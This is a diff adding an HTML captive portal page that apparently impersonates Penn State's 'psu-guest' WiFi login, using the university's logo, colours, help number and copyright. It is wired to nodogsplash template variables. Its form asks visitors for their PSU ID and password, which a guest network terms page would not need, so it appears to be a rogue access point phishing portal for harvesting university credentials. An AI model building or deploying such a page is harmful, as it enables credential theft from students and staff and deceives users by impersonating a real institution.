@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penn State | Login to psu-guest WiFi | Login</title>
+    <style>
+        body {
+            background-color: #1A3C84;
+            color: white;
+            font-family: 'Open Sans', sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .box {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .logo-container {
+            background-color: rgba(200, 200, 200, 0.2);
+            border-radius: 15px;
+            padding: 20px;
+            display: inline-block;
+            margin-bottom: 30px;
+        }
+
+        .nwaForm {
+            margin: 30px 0;
+        }
+
+        .nwaForm input[type="password"],
+        .nwaForm input[type="text"] {
+            padding: 10px;
+            margin: 10px 0;
+            width: 250px;
+            font-size: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        input[type="submit"] {
+            padding: 10px 20px;
+            margin: 15px 0;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            background-color: #2d5ab9;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 300px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #1e3c7d;
+        }
+
+        a {
+            color: #66ffff;
+        }
+
+        .skiplinks {
+            position: absolute;
+            left: -9999px;
+        }
+
+        #box3 {
+            margin-bottom: 0;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body class="metro large nonav">
+    <div class="skiplinks">
+        <a href="#box2">Skip to main</a>
+    </div>
+    <div id="root">
+        <div class="box" id="box1" role="banner" aria-label="Banner">
+            <h1>
+                <div class="logo-container">
+                    <div id="box3">
+                        <img src="psulogoforincommon-456x150.png" alt="Penn State Logo" style="max-width: 456px; width: 75%;">
+                    </div>
+                </div>
+            </h1>
+        </div>
+
+        <div class="box" id="box2" role="main" aria-label="Login">
+            <div id="content-marker">
+                <p>
+                    <div style="font-size: 25px; margin-bottom: 20px;">
+                        Welcome to Penn State!
+                    </div>
+                </p>
+                <div style="font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
+                    Penn State provides free wireless access for visitors and guests. By clicking the Accept and Connect button below, you acknowledge your acceptance of the <a href="/guest/public/psu-guest/terms.html">Terms of Use</a> for Penn State's guest wireless network.
+                </div>
+
+                <div class="nwaForm">
+                    <form method='get' action='$authaction'>
+                        <input type='hidden' name='tok' value='$tok'>
+                        <input type='hidden' name='redir' value='$redir'>
+
+                        <div class="form-group">
+                            <label for="psu-id">PSU ID:</label>
+                            <input type='text' id="psu-id" name='psuId' placeholder='Enter your PSU ID' required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password">Password:</label>
+                            <input type='password' id="password" name='nodogpass' placeholder='Enter password' required>
+                        </div>
+
+                        <input type='submit' value='Accept and Connect'>
+                    </form>
+                </div>
+
+                <div style="font-size: 16px; line-height: 1.6; margin: 20px 0;">
+                    If you have a Penn State access account, please click the button below to set up Penn State's wireless network on your device.
+                </div>
+
+                <input type="submit" onclick="location.href='https://wireless.psu.edu';" value="Setup Penn State Wireless">
+
+                <div style="font-size: 16px; line-height: 1.6; margin-top: 30px;">
+                    For Assistance please call 814-865-4357 (HELP)
+                </div>
+                <div style="font-size: 12px; margin-top: 20px;">
+                    © Copyright 2025 The Pennsylvania State University
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
